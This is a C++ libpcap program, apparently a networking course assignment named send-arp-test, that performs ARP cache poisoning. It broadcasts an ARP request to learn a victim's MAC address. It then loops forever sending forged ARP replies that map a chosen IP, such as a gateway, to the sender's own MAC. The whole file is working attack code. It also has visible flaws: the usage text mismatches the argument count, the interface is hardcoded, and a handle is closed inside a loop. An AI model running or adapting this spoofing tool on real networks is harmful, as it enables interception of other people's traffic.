#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <libnet.h>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <stdint.h>
#include <unistd.h>


/// MAC 주소 길이
#define MAC_ALEN 6

/// MAC 주소 출력 매크로
#define MAC_ADDR_FMT "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

int GetInterfaceMacAddress(const char *ifname, uint8_t *mac_addr)
{
  struct ifreq ifr;
  int sockfd, ret;


  /*
   * 네트워크 인터페이스 소켓을 연다.
   */
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0) {
    printf("Fail to get interface MAC address - socket() failed - %m\n");
    return -1;
  }

  /*
   * 네트워크 인터페이스의 MAC 주소를 확인한다.
   */
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
  ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
  if (ret < 0) {
    printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
    close(sockfd);
    return -1;
  }
  memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

  /*
   * 네트워크 인터페이스 소켓을 닫는다.
   */
  close(sockfd);

  return 0;
}



int s_getIpAddress (const char * ifr, unsigned char * out) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, ifr);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror( "ioctl() SIOCGIFADDR error");
        return -1;
    }
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

    close(sockfd);

    return 4;
}


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

typedef struct {
    char* dev_;
} Param;

Param param  = {
    .dev_ = NULL
};

struct arp_packet
{
    u_int8_t sma[6];//sender Mac address
    u_int8_t sip[4];//sender IP address
    u_int8_t tma[6];//target Mac address
    u_int8_t tip[4];//target IP address
};

struct arp_packet arp_pc;

int send_ARP(char *dev,char *eth_smac,char *eth_dmac,char *sip,char *smac,char *tip,char *tmac)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }



    const u_char* packet2;
    struct pcap_pkthdr* header;
    struct EthHdr *ethhd;
    struct ArpHdr *arphd;


    while (true)
    {

        int res = pcap_next_ex(handle, &header, &packet2);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        /*
        eth_header = (struct libnet_ethernet_hdr *)packet;
        arp_packet2 = (struct arp_packet *)(packet + sizeof(libnet_ethernet_hdr)+ sizeof(libnet_arp_hdr)+2);
        */

    // && (ntohs(arphd->op_)==ArpHdr::Reply)

        ethhd = (struct EthHdr*)packet2;
        arphd = (struct ArpHdr*)(packet2 + sizeof(EthHdr));

        if ((ntohs(ethhd->type_) == EthHdr::Arp))
        {
                memcpy(arp_pc.sma,&arphd->smac_,6);
                return 0;

        }
pcap_close(handle);
    }


    return 0;
}

int send_ARP_(char *dev,char *eth_smac,char *eth_dmac,char *sip,char *smac,char *tip,char *tmac)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    for(int i=0;i<10;i++)
    {
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    }
    pcap_close(handle);

}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}
    char* dev = argv[1];


    //get my ip,mac address

    unsigned char addr[4] = {0,};
    const char *ifname = "eth0";
    uint8_t mac_addr[MAC_ALEN];
    GetInterfaceMacAddress(ifname, mac_addr);
    if (s_getIpAddress("eth0", addr) > 0) {
    }
    char ipa[20]; // my ip address
    char maa[20];  // my mac address
    sprintf(ipa,"%d.%d.%d.%d",(int)addr[0],(int)addr[1],(int)addr[2],(int)addr[3]);
    sprintf(maa,"%02x:%02x:%02x:%02x:%02x:%02x",MAC_ADDR_FMT_ARGS(mac_addr));

    /* /////////////////////////////////////////////////////////////////////////////// */



    //BroadCast

    send_ARP(dev,maa,"ff:ff:ff:ff:ff:ff",ipa,maa,argv[2],"00:00:00:00:00:00");

    printf("2\n");
    char sma[20]; // sender mac

    sprintf(sma,"%02x:%02x:%02x:%02x:%02x:%02x",arp_pc.sma[0],arp_pc.sma[1],arp_pc.sma[2],arp_pc.sma[3],arp_pc.sma[4],arp_pc.sma[5]);
    printf("%s\n",sma);
    while(true)
    {
    send_ARP_(dev,maa,sma,argv[3],maa,argv[2],sma);
    sleep(1);
    }

}
